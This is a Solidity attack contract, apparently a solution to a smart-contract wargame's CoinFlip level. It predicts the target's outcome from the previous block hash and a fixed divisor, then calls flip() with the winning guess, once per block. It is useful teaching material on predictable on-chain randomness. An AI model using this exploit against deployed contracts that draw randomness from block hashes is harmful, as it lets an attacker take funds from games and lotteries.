// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.21;

import {CoinFlip} from "../levels/CoinFlip.sol";

contract CoinFlipAttack {
    CoinFlip public coinFlip;
    uint256 public lastHash;
    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipAddress) {
	coinFlip = CoinFlip(_coinFlipAddress);
    }
    
    function attack() public returns (bool) {
	uint256 blockValue = uint256(blockhash(block.number - 1));

	if (lastHash == blockValue) {
	    revert();
	}

	lastHash = blockValue;
	uint256 guess = blockValue / FACTOR;
	return coinFlip.flip(guess == 1);
    }
}
